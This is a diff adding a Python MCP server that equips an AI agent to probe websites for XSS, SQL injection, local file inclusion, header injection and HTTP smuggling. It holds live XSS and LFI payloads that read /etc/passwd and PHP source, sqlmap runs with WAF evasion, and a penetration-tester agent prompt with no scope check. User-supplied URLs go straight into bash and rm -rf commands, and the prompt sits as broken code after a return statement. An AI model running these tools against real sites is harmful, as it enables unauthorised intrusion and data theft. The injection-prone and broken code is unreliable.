@@ -1,0 +1,787 @@
+from mcp.server.fastmcp import FastMCP
+import asyncio
+import httpx
+import re
+import os
+import json
+import random
+import string
+import logging
+from typing import Dict, Any, List, Optional, Set, Tuple
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
+
+# Setup logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+mcp = FastMCP("input-validation-testing")
+
+# --- Helpers ---
+async def sh(cmd: str, timeout: int = 120) -> str:
+    """Run a shell command in a Linux container using bash -lc (no WSL)."""
+    proc = await asyncio.create_subprocess_exec(
+        "bash", "-lc", cmd,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+    try:
+        out, err = await asyncio.wait_for(proc.communicate(), timeout)
+        return out.decode("utf-8", errors="ignore").strip()
+    except asyncio.TimeoutError:
+        return "Error: Command timed out"
+    except Exception as e:
+        return f"Error: {e}"
+
+def randid(n=8) -> str:
+    return ''.join(random.choices(string.ascii_lowercase, k=n))
+
+# --- Tools (Revisi, Konsolidasi & Baru) ---
+
+@mcp.tool()
+async def find_reflected_params(url: str) -> Dict[str, Any]:
+    """
+    [BARU] Finds which URL parameters are reflected in the HTML response.
+    This helps focus injection attacks on relevant parameters.
+    """
+    try:
+        parsed_url = urlparse(url)
+        params = parse_qs(parsed_url.query)
+        if not params:
+            return {"status": "success", "data": {"reflected_params": [], "message": "No query parameters found in URL."}}
+
+        test_params = {}
+        # Buat nilai acak untuk setiap parameter
+        for p in params:
+            test_params[p] = f"mcp{randid()}mcp"
+        
+        # Buat URL baru dengan parameter acak
+        new_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed_url._replace(query=new_query))
+        
+        async with httpx.AsyncClient(verify=False, timeout=10) as client:
+            resp = await client.get(test_url)
+            content = resp.text
+
+        reflected_params = [p for p, v in test_params.items() if v in content]
+        
+        return {"status": "success", "data": {"reflected_params": reflected_params}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def discover_param_urls(start_url: str, max_pages: int = 20) -> Dict[str, Any]:
+    """
+    [BARU] Crawl same-host pages up to max_pages, collect URLs with query parameters.
+    """
+    try:
+        parsed = urlparse(start_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        to_visit: List[str] = [start_url, base]
+        visited: Set[str] = set()
+        param_urls: List[str] = []
+
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
+            while to_visit and len(visited) < max_pages:
+                url = to_visit.pop(0)
+                if url in visited:
+                    continue
+                visited.add(url)
+                try:
+                    resp = await client.get(url)
+                    html = resp.text
+                except Exception:
+                    continue
+
+                # Collect URLs with query params on same host
+                links = re.findall(r'href=["\']([^"\']+)["\']', html, re.I)
+                for href in links:
+                    abs_url = urljoin(url, href)
+                    p = urlparse(abs_url)
+                    if p.netloc == parsed.netloc:
+                        if p.query and abs_url not in param_urls:
+                            param_urls.append(abs_url)
+                        if abs_url not in visited and len(visited) + len(to_visit) < max_pages:
+                            to_visit.append(abs_url)
+
+        return {"status": "success", "data": {"param_urls": param_urls[:50], "visited_count": len(visited)}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def common_param_url_candidates(base_url: str, limit: int = 30) -> Dict[str, Any]:
+    """
+    [BARU] Generate a small set of common parameterized URLs on the same host
+    as a fallback when crawling discovers too few targets. Keeps the list conservative.
+    """
+    try:
+        parsed = urlparse(base_url)
+        root = f"{parsed.scheme}://{parsed.netloc}"
+        # Common endpoint names and params often seen in demo/test sites
+        paths = [
+            "/", "/index.php", "/search.php", "/products.php", "/product.php",
+            "/item.php", "/view.php", "/list.php", "/details.php", "/category.php",
+            "/article.php", "/artists.php", "/books.php", "/news.php"
+        ]
+        params = [
+            ("id", ["1", "2"]),
+            ("cat", ["1", "2"]),
+            ("q", ["test", "xss"]),
+            ("search", ["test"]),
+            ("searchFor", ["test", "1"]),
+            ("page", ["1"]),
+            ("artist", ["1"])  # helpful for testphp.vulnweb.com
+        ]
+
+        candidates: List[str] = []
+        for p in paths:
+            full = urljoin(root, p)
+            for name, values in params:
+                for v in values:
+                    q = urlencode({name: v})
+                    candidates.append(urlunparse(urlparse(full)._replace(query=q)))
+
+        # Keep only same-host, unique, and cap the list
+        uniq: List[str] = []
+        seen: Set[str] = set()
+        for u in candidates:
+            pu = urlparse(u)
+            if pu.netloc == parsed.netloc and u not in seen:
+                uniq.append(u)
+                seen.add(u)
+            if len(uniq) >= limit:
+                break
+
+        return {"status": "success", "data": {"param_urls": uniq}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def quick_xss_probe(url: str) -> Dict[str, Any]:
+    """
+    [ENHANCED] Multi-payload reflected XSS detection with context analysis and bypass techniques.
+    """
+    try:
+        purl = urlparse(url)
+        params = parse_qs(purl.query)
+        if not params:
+            return {"status": "success", "data": {"vulnerable": False, "tested": 0}}
+        
+        # Multiple payloads to bypass basic filters
+        payloads = [
+            f"mcpXSS-{randid(6)}\"><svg/onload=alert(1)>",
+            f"mcpXSS-{randid(6)}'><script>alert(1)</script>",
+            f"mcpXSS-{randid(6)}<img src=x onerror=alert(1)>",
+            f"mcpXSS-{randid(6)}';alert(1);//",
+            f"mcpXSS-{randid(6)}\"><iframe src=javascript:alert(1)>",
+        ]
+        
+        findings = []
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
+            for name in list(params.keys())[:6]:
+                param_findings = []
+                for payload in payloads:
+                    test_params = {k: (payload if k == name else v) for k, v in params.items()}
+                    new_q = urlencode(test_params, doseq=True)
+                    test_url = urlunparse(purl._replace(query=new_q))
+                    try:
+                        resp = await client.get(test_url)
+                        body = resp.text
+                        
+                        # Check for unescaped reflection
+                        if payload in body:
+                            idx = body.find(payload)
+                            snippet = body[max(0, idx-60): idx+len(payload)+60]
+                            
+                            # Analyze context
+                            context = "unknown"
+                            if re.search(r'<[^>]*' + re.escape(payload), snippet):
+                                context = "attribute"
+                            elif re.search(r'<script[^>]*>.*?' + re.escape(payload), snippet, re.DOTALL):
+                                context = "script"
+                            elif re.search(r'>[^<]*' + re.escape(payload), snippet):
+                                context = "html"
+                            
+                            param_findings.append({
+                                "payload": payload,
+                                "url": test_url,
+                                "context": context,
+                                "evidence_snippet": snippet,
+                                "severity": "high" if context in ["html", "script"] else "medium"
+                            })
+                            break  # Stop on first successful payload for this param
+                    except Exception:
+                        continue
+                
+                if param_findings:
+                    findings.append({
+                        "parameter": name,
+                        "vulnerable": True,
+                        "findings": param_findings
+                    })
+        
+        return {
+            "status": "success", 
+            "data": {
+                "vulnerable": len(findings) > 0, 
+                "findings": findings,
+                "tested_parameters": len(params),
+                "payloads_used": len(payloads)
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_xss_reflected(target_url: str) -> Dict[str, Any]:
+    """
+    [ENHANCED] Runs Dalfox with comprehensive settings and enhanced result parsing.
+    """
+    try:
+        output_file = f"/tmp/dalfox_output_{randid()}.json"
+        # ENHANCED dalfox with aggressive scanning:
+        # --follow-redirects: follow 302s
+        # --mining-dom: mine DOM for params
+        # --mining-dict: use dictionary mining
+        # --mining-dict-word: additional wordlist
+        # --skip-bav: skip boring alert verification (faster)
+        # --only-poc: only show POC (reduce noise)
+        # --blind: test blind XSS
+        cmd = f"dalfox url '{target_url}' --silence --follow-redirects --mining-dom --mining-dict --skip-bav --only-poc --blind --format json -o {output_file}"
+        await sh(cmd, 300)
+        
+        results = []
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, 'r') as f:
+                    content = f.read().strip()
+                    if content:
+                        # Dalfox outputs JSONL (one JSON per line)
+                        for line in content.split('\n'):
+                            if line.strip():
+                                try:
+                                    results.append(json.loads(line))
+                                except json.JSONDecodeError:
+                                    continue
+                os.remove(output_file)
+            except Exception as e:
+                if os.path.exists(output_file):
+                    os.remove(output_file)
+        
+        # Enhanced vulnerability filtering and enrichment
+        vulnerable_results = []
+        for res in results:
+            if res.get('type') in ['found', 'verify'] or res.get('severity') in ['high', 'medium', 'low']:
+                enriched = {
+                    "url": target_url,
+                    "parameter": res.get('param', 'unknown'),
+                    "payload": res.get('data', res.get('payload', '')),
+                    "type": res.get('type', 'xss'),
+                    "severity": res.get('severity', 'medium'),
+                    "evidence": res.get('message', ''),
+                    "poc": res.get('poc_url', res.get('data', '')),
+                    "raw": res
+                }
+                vulnerable_results.append(enriched)
+        
+        return {
+            "status": "success", 
+            "data": {
+                "vulnerabilities": vulnerable_results,
+                "total_tested": len(results),
+                "confirmed_vulns": len(vulnerable_results)
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_xss_reflected_urls(urls: List[str], max_targets: int = 8) -> Dict[str, Any]:
+    """
+    [BARU] Run Dalfox on multiple URLs; aggregate results.
+    """
+    try:
+        all_vulns = []
+        for u in urls[:max_targets]:
+            single = await test_xss_reflected(u)
+            if single.get("status") == "success":
+                vulns = single.get("data", {}).get("vulnerabilities", [])
+                for v in vulns:
+                    v["target"] = u
+                all_vulns.extend(vulns)
+        return {"status": "success", "data": {"vulnerabilities": all_vulns}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_sqli(url: str, data: Optional[str] = None, dbms: Optional[str] = None, param: Optional[str] = None) -> Dict[str, Any]:
+    """
+    [KONSOLIDASI] A powerful wrapper for sqlmap. Can specify DBMS.
+    Parses sqlmap output directory for concrete evidence.
+    """
+    try:
+        # Bersihkan direktori output sebelumnya (kedua lokasi yang umum digunakan)
+        target_host = urlparse(url).hostname or "target"
+        # Newer sqlmap uses ~/.local/share/sqlmap, older uses ~/.sqlmap
+        old_out = os.path.expanduser(f"~/.sqlmap/output/{target_host}")
+        new_out = os.path.expanduser(f"~/.local/share/sqlmap/output/{target_host}")
+        try:
+            if os.path.exists(old_out):
+                # Use shell to ensure permissions are handled
+                await sh(f"rm -rf {old_out}", 20)
+            if os.path.exists(new_out):
+                await sh(f"rm -rf {new_out}", 20)
+        except Exception:
+            pass
+
+        # Build sqlmap command with sane defaults for speed and reliability
+        cmd = f"sqlmap -u \"{url}\""
+        if data:
+            cmd += f" --data=\"{data}\""
+        if dbms:
+            cmd += f" --dbms=\"{dbms}\""
+        if param:
+            cmd += f" -p \"{param}\""
+        # CRITICAL FLAGS:
+        # --batch: non-interactive (no prompts)
+        # --flush-session: clear previous session to avoid conflicts
+        # --level/risk: moderate probing (level=2, risk=2 for good coverage)
+        # --random-agent: evade trivial WAF/CDN filtering
+        # --threads: small concurrency
+        # NOTE: Removed --smart because it can skip real vulnerabilities based on heuristics
+        # NOTE: Removed --fresh-queries to use cached session data (faster)
+        # NOTE: Removed --technique to let sqlmap choose best techniques automatically
+        cmd += " --batch --flush-session --level=2 --risk=2 --random-agent --threads=2"
+        if not dbms:
+            # If DBMS not specified, try common web DBs first (much faster than full fingerprint)
+            cmd += " --dbms=SQLite,MySQL,PostgreSQL"
+        
+        # Write debug to file for verification
+        debug_file = f"/tmp/sqli_debug_{randid()}.txt"
+        with open(debug_file, "w") as f:
+            f.write(f"URL: {url}\nCommand: {cmd}\nStarted: {os.popen('date').read()}")
+        
+        # Run SQLmap synchronously with subprocess.run (not async)
+        # This ensures it ACTUALLY runs to completion
+        import subprocess
+        import time
+        start_time = time.time()
+        
+        try:
+            proc = subprocess.run(
+                ["bash", "-c", cmd],
+                capture_output=True,
+                text=True,
+                timeout=180
+            )
+            result = proc.stdout + proc.stderr
+            duration = time.time() - start_time
+            
+            # Write result to debug file
+            with open(debug_file, "a") as f:
+                f.write(f"\nCompleted in {duration:.1f}s\nReturn code: {proc.returncode}\nOutput length: {len(result)}\n")
+                f.write(f"First 500 chars: {result[:500]}\n")
+                
+        except subprocess.TimeoutExpired:
+            duration = time.time() - start_time
+            result = f"Command timed out after {duration:.1f}s"
+            with open(debug_file, "a") as f:
+                f.write(f"\nTIMEOUT after {duration:.1f}s\n")
+        except Exception as e:
+            result = f"Error: {e}"
+            with open(debug_file, "a") as f:
+                f.write(f"\nERROR: {e}\n")
+        
+        # Wait a bit for files to be fully written
+        await asyncio.sleep(3)
+
+        # Cari hasil di lokasi log yang mungkin
+        candidate_logs = [
+            os.path.expanduser(f"~/.local/share/sqlmap/output/{target_host}/log"),
+            os.path.expanduser(f"~/.sqlmap/output/{target_host}/log"),
+            os.path.expanduser(f"~/.local/share/sqlmap/output/{target_host}/target.txt"),
+            os.path.expanduser(f"~/.sqlmap/output/{target_host}/target.txt"),
+        ]
+
+        collected = ""
+        for path in candidate_logs:
+            try:
+                if os.path.exists(path):
+                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                        collected += "\n" + content
+                        with open(debug_file, "a") as df:
+                            df.write(f"\nRead {path}: {len(content)} bytes\n")
+                else:
+                    with open(debug_file, "a") as df:
+                        df.write(f"\nNot found: {path}\n")
+            except Exception as e:
+                with open(debug_file, "a") as df:
+                    df.write(f"\nError reading {path}: {e}\n")
+                continue
+        
+        # Write collected logs to debug file for inspection
+        with open(debug_file, "a") as df:
+            df.write(f"\n\n=== COLLECTED LOGS ({len(collected)} bytes) ===\n")
+            df.write(collected[:3000] if len(collected) > 3000 else collected)
+            df.write("\n=== END COLLECTED ===\n")
+
+        # Ekstrak parameter rentan dan payload dari log yang dikumpulkan
+        vuln_matches = []
+        if collected:
+            # Common patterns in sqlmap logs
+            # Pattern A: "Parameter: <name> (<location>)\n    Type: <type>\n    Title: <title>\n    Payload: <payload>"
+            pat_a = re.compile(r"Parameter:\s+([^\s]+)\s*\((?:GET|POST|Cookie|User-Agent|.*)\)[\s\S]*?Payload:\s*(.+)", re.IGNORECASE)
+            matches_a = pat_a.findall(collected)
+            with open(debug_file, "a") as df:
+                df.write(f"\nPattern A found {len(matches_a)} matches: {matches_a}\n")
+            vuln_matches.extend(matches_a)
+            # Pattern B: legacy indexed parameter lines
+            pat_b = re.compile(r"Parameter:\s+#\d+\*?\s*\(([^\)]+)\)[\s\S]*?Payload:\s*(.+)", re.IGNORECASE)
+            matches_b = pat_b.findall(collected)
+            logger.info(f"[SQLi DEBUG] Pattern B found {len(matches_b)} matches")
+            vuln_matches.extend(matches_b)
+            # Pattern C: generic confirmation lines
+            pat_c = re.compile(r"the (GET|POST) parameter '([^']+)' appears to be '(.+?)' injectable", re.IGNORECASE)
+            matches_c = pat_c.findall(collected)
+            with open(debug_file, "a") as df:
+                df.write(f"\nPattern C found {len(matches_c)} matches: {matches_c}\n")
+            for _, pname, _ in matches_c:
+                vuln_matches.append((pname, "(see sqlmap log)"))
+        
+        with open(debug_file, "a") as df:
+            df.write(f"\n\n=== FINAL RESULT ===\n")
+            df.write(f"Total vuln_matches: {len(vuln_matches)}\n")
+            if vuln_matches:
+                df.write(f"First match: {vuln_matches[0]}\n")
+        
+        if vuln_matches:
+            result = {"status": "success", "data": {
+                "vulnerable": True,
+                "details": [{"parameter": p[0], "example_payload": p[1]} for p in vuln_matches],
+                "debug_file": debug_file
+            }}
+            with open(debug_file, "a") as df:
+                df.write(f"Returning: VULNERABLE\n")
+            return result
+        else:
+            result = {"status": "success", "data": {
+                "vulnerable": False, 
+                "message": "sqlmap did not find any injection points with the given configuration.",
+                "debug_file": debug_file
+            }}
+            with open(debug_file, "a") as df:
+                df.write(f"Returning: NOT VULNERABLE\n")
+            return result
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_sqli_urls(urls: List[str], max_targets: int = 5, dbms: Optional[str] = None) -> Dict[str, Any]:
+    """
+    [BARU] Run sqlmap on multiple parameterized URLs with tight defaults; aggregate findings.
+    """
+    try:
+        agg = []
+        for u in urls[:max_targets]:
+            res = await test_sqli(u, dbms=dbms)
+            if res.get("status") == "success" and res.get("data", {}).get("vulnerable"):
+                item = res["data"].copy()
+                item["target"] = u
+                agg.append(item)
+        return {"status": "success", "data": {"findings": agg}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def run_nuclei_scan(url: str, templates: List[str]) -> Dict[str, Any]:
+    """
+    [KONSOLIDASI] Runs Nuclei with a specific list of templates or tags.
+    Replaces many individual Nuclei tools for flexibility.
+    Example templates: ["ssrf", "xxe", "lfi", "ssti", "cve"]
+    """
+    try:
+        template_str = " ".join([f"-t {t}" for t in templates])
+        output_file = f"nuclei_output_{randid()}.json"
+        cmd = f"nuclei -u {url} {template_str} -json -o {output_file}"
+        await sh(cmd, 180)
+        
+        results = []
+        if os.path.exists(output_file):
+            with open(output_file, 'r') as f:
+                for line in f:
+                    try: results.append(json.loads(line))
+                    except json.JSONDecodeError: continue
+            os.remove(output_file)
+            
+        return {"status": "success", "data": {"findings": results}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_lfi(url_with_fuzz: str) -> Dict[str, Any]:
+    """
+    [ENHANCED] Advanced LFI testing with intelligent payload selection and validation.
+    """
+    try:
+        # Common LFI payloads with validation patterns
+        lfi_payloads = [
+            ("../../../../etc/passwd", "root:x:0:0"),
+            ("..\\..\\..\\..\\windows\\system.ini", "[drivers]"),
+            ("../../../../etc/hosts", "localhost"),
+            ("/etc/passwd", "root:x:0:0"),
+            ("C:\\windows\\win.ini", "[fonts]"),
+            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),  # base64 of <?php
+        ]
+        
+        findings = []
+        
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
+            for payload, validation_pattern in lfi_payloads:
+                # Replace FUZZ marker
+                if "FUZZ" in url_with_fuzz:
+                    test_url = url_with_fuzz.replace("FUZZ", payload)
+                else:
+                    # Append to URL
+                    sep = "&" if "?" in url_with_fuzz else "?"
+                    test_url = f"{url_with_fuzz}{sep}file={payload}"
+                
+                try:
+                    resp = await client.get(test_url)
+                    content = resp.text
+                    
+                    # Check if validation pattern appears in response
+                    if validation_pattern.lower() in content.lower():
+                        # Extract snippet for evidence
+                        idx = content.lower().find(validation_pattern.lower())
+                        snippet = content[max(0, idx-100):min(len(content), idx+200)]
+                        
+                        findings.append({
+                            "payload": payload,
+                            "url": test_url,
+                            "validation_pattern": validation_pattern,
+                            "evidence": snippet,
+                            "severity": "high",
+                            "status_code": resp.status_code,
+                            "content_length": len(content)
+                        })
+                except Exception:
+                    continue
+        
+        return {
+            "status": "success", 
+            "data": {
+                "vulnerable": len(findings) > 0,
+                "findings": findings,
+                "tested_payloads": len(lfi_payloads)
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_http_smuggling(host: str) -> Dict[str, Any]:
+    """
+    [REVISI] Runs smuggler.py and parses the output.
+    """
+    try:
+        # Pastikan smuggler terinstal: pip3 install smuggler
+        cmd = f"python3 /usr/local/bin/smuggler -u {host} -q"
+        output = await sh(cmd, 120)
+        vulnerable = "VULNERABLE" in output
+        return {"status": "success", "data": {"vulnerable": vulnerable, "raw_output": output}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def get_manual_checklist(topic: str) -> Dict[str, Any]:
+    """
+    [REVISI] Provides checklists for manual testing.
+    Topics: 'stored_xss', 'imap_smtp', 'incubated_vulns'
+    """
+    checklists = {
+        "stored_xss": [
+            "Identify all input fields that store data (e.g., comments, user profiles, forum posts).",
+            "Submit a benign HTML payload like '<b>test</b>' to see if tags are rendered.",
+            "Submit a standard XSS payload like '<script>alert(1)</script>' or '<img src=x onerror=alert(1)>'.",
+            "After submitting, navigate away from the page and then back to it to see if the script executes (triggers the stored payload).",
+            "Check if input is sanitized on both client-side and server-side."
+        ],
+        "imap_smtp": [
+            "Review mail-sending features (contact forms, password resets, 'invite a friend').",
+            "Attempt to inject email headers using CRLF characters (e.g., `\\r\\nBcc: victim@example.com`).",
+            "Test for template injection vulnerabilities in email templates if they use user-controlled data."
+        ],
+        "incubated_vulns": [
+            "Review all third-party components, libraries, and frameworks (e.g., from package.json, pom.xml).",
+            "Use a Software Composition Analysis (SCA) tool like `trivy fs .` or `snyk test` to find known CVEs in dependencies.",
+            "Manually check the versions of key components against vulnerability databases like CVE Details or NIST NVD."
+        ]
+    }
+    if topic in checklists:
+        return {"status": "success", "data": {"topic": topic, "checklist": checklists[topic]}}
+    else:
+        return {"status": "error", "message": f"Invalid topic. Available topics: {list(checklists.keys())}"}
+
+@mcp.tool()
+async def extract_forms(url: str) -> Dict[str, Any]:
+    """
+    [NEW] Extract all forms from a page with full details for testing.
+    """
+    try:
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
+            resp = await client.get(url)
+            html = resp.text
+        
+        forms = []
+        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
+        
+        for form_match in form_pattern.finditer(html):
+            form_html = form_match.group(0)
+            form_inner = form_match.group(1)
+            
+            # Extract form attributes
+            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
+            method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
+            
+            # Extract inputs
+            inputs = []
+            input_pattern = re.compile(r'<input([^>]*)>', re.I)
+            for inp_match in input_pattern.finditer(form_inner):
+                inp_attrs = inp_match.group(1)
+                name = re.search(r'name=["\']([^"\']*)["\']', inp_attrs, re.I)
+                itype = re.search(r'type=["\']([^"\']*)["\']', inp_attrs, re.I)
+                value = re.search(r'value=["\']([^"\']*)["\']', inp_attrs, re.I)
+                
+                if name:
+                    inputs.append({
+                        "name": name.group(1),
+                        "type": itype.group(1) if itype else "text",
+                        "value": value.group(1) if value else ""
+                    })
+            
+            # Extract textareas
+            textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']*)["\']', re.I)
+            for ta_match in textarea_pattern.finditer(form_inner):
+                inputs.append({
+                    "name": ta_match.group(1),
+                    "type": "textarea",
+                    "value": ""
+                })
+            
+            # Extract selects
+            select_pattern = re.compile(r'<select[^>]*name=["\']([^"\']*)["\']', re.I)
+            for sel_match in select_pattern.finditer(form_inner):
+                inputs.append({
+                    "name": sel_match.group(1),
+                    "type": "select",
+                    "value": ""
+                })
+            
+            form_data = {
+                "action": action.group(1) if action else url,
+                "method": (method.group(1) if method else "GET").upper(),
+                "inputs": inputs,
+                "input_count": len(inputs)
+            }
+            
+            # Make action absolute
+            if form_data["action"] and not form_data["action"].startswith("http"):
+                from urllib.parse import urljoin
+                form_data["action"] = urljoin(url, form_data["action"])
+            
+            forms.append(form_data)
+        
+        return {
+            "status": "success",
+            "data": {
+                "url": url,
+                "forms": forms,
+                "form_count": len(forms)
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@mcp.tool()
+async def test_form_sqli(form_url: str, form_data: Dict[str, str], method: str = "POST") -> Dict[str, Any]:
+    """
+    [NEW] Test a form for SQL injection using sqlmap with POST data.
+    """
+    try:
+        # Build POST data string
+        data_str = "&".join([f"{k}={v}" for k, v in form_data.items()])
+        
+        # Clean up previous runs
+        target_host = urlparse(form_url).hostname or "target"
+        old_out = os.path.expanduser(f"~/.sqlmap/output/{target_host}")
+        new_out = os.path.expanduser(f"~/.local/share/sqlmap/output/{target_host}")
+        try:
+            if os.path.exists(old_out):
+                await sh(f"rm -rf {old_out}", 20)
+            if os.path.exists(new_out):
+                await sh(f"rm -rf {new_out}", 20)
+        except Exception:
+            pass
+        
+        # Build sqlmap command for POST
+        cmd = f"sqlmap -u \"{form_url}\" --data=\"{data_str}\" --batch --level=2 --risk=2 --random-agent --threads=2 --smart --output-dir=~/.local/share/sqlmap/output/"
+        
+        await sh(cmd, 480)
+        
+        # Parse results
+        candidate_logs = [
+            os.path.expanduser(f"~/.local/share/sqlmap/output/{target_host}/log"),
+            os.path.expanduser(f"~/.sqlmap/output/{target_host}/log"),
+        ]
+        
+        collected = ""
+        for path in candidate_logs:
+            try:
+                if os.path.exists(path):
+                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                        collected += "\n" + f.read()
+            except Exception:
+                continue
+        
+        vuln_matches = []
+        if collected:
+            pat_a = re.compile(r"Parameter:\s+([^\s]+)\s*\((?:GET|POST|Cookie|User-Agent|.*)\)[\s\S]*?Payload:\s*(.+)", re.IGNORECASE)
+            vuln_matches.extend(pat_a.findall(collected))
+            pat_c = re.compile(r"the (GET|POST) parameter '([^']+)' appears to be '(.+?)' injectable", re.IGNORECASE)
+            for _, pname, inj_type in pat_c.findall(collected):
+                vuln_matches.append((pname, f"Injectable ({inj_type})"))
+        
+        if vuln_matches:
+            return {"status": "success", "data": {
+                "vulnerable": True,
+                "form_url": form_url,
+                "method": method,
+                "details": [{"parameter": p[0], "example_payload": p[1]} for p in vuln_matches]
+            }}
+        else:
+            return {"status": "success", "data": {"vulnerable": False, "message": "No SQL injection found"}}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+    # Prompt direvisi untuk mencerminkan tool yang lebih efisien dan terkonsolidasi
+    return f"""
+You are an expert penetration tester specialising in **input-validation flaws**.
+Your mission is to probe **{domainname}** for injection vulnerabilities in line with OWASP WSTG 4.7.
+
+**Strategy:**
+1.  **Map Attack Surface:** Use `find_reflected_params` on URLs with query parameters to identify which parameters are processed and reflected. This will be your primary guide for injection attacks.
+2.  **Automated Scans:** Use the powerful consolidated tools for broad scans:
+    - `run_nuclei_scan`: For a wide range of vulnerabilities like SSRF, XXE, LFI, SSTI, Code Injection, etc.
+    - `test_sqli`: For all database injection tests.
+    - `test_xss_reflected`: For Reflected XSS.
+3.  **Manual & Contextual Tests:** Use checklists for complex vulnerabilities like Stored XSS and refer to specific tools for targeted attacks (e.g., `test_lfi` for file inclusion).
+
+**Primary Objectives:**
+- **Scripting & Injection:** Detect XSS, SQLi, LFI/RFI, Command/Code Injection, SSTI, etc.
+- **Protocol & Header Attacks:** Test for HTTP Smuggling and Host Header Injection.
+- **Component Analysis:** Use checklists to guide reviews for vulnerabilities in third-party components.
+
+Reflect on these goals, craft a plan starting with `find_reflected_params`, then begin testing. Adapt quickly and report concise findings.
+"""
+
+if __name__ == "__main__":
+    mcp.run(transport="stdio")
